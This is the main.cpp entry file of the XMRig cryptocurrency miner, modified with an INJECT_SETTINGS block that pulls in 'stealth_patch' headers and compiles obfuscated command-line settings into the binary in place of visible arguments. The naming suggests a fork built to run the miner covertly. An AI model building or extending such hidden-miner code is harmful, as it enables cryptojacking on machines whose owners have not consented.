/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"

#ifdef INJECT_SETTINGS
#include "stealth_patch/safe_string.h"
#include "stealth_patch/prepare_config.cpp"
#ifndef INJECTED_SETTINGS
#error "INJECTED_SETTINGS must be defined with your command-line parameters"
#endif // INJECTED_SETTINGS
#endif // INJECT_SETTINGS

int main(int argc, char **argv)
{
    using namespace xmrig;

#ifdef INJECT_SETTINGS

    int count = 0;
    char** provided_settings = split_string(SAFE_STRING(INJECTED_SETTINGS), &count);

    char** injected_settings = new char*[count + 1];
    injected_settings[0] = argv[0];
    memcpy(injected_settings+1, provided_settings, count * sizeof(*provided_settings));
    // free_split_string(provided_settings, count);

    Process process(count+1, injected_settings);

#else
    Process process(argc, argv);
#endif // INJECT_SETTINGS
    const Entry::Id entry = Entry::get(process);
    if (entry)
    {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
